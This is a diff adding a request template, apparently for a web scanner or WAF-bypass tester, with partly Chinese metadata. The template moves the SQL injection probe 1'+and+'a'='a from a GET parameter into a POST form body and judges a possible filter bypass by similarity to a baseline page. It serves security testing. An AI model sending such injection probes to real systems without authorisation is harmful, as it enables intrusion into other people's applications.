@@ -1,0 +1,16 @@
+# @name: GET转POST Body探测
+# @tags: post,body,form,id,bypass
+# @color: purple
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: get_param_to_post_body
+# @intent.param: id
+# @intent.payload: 1'+and+'a'='a
+# @intent.content_type: application/x-www-form-urlencoded
+# @note: 将原本 /?id=1'+and+'a'='a 的 GET 参数，改为 POST Body 里的 form 参数，并按基线页面相似度判定是否可能绕过。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: application/x-www-form-urlencoded
+
+id=1'+and+'a'='a
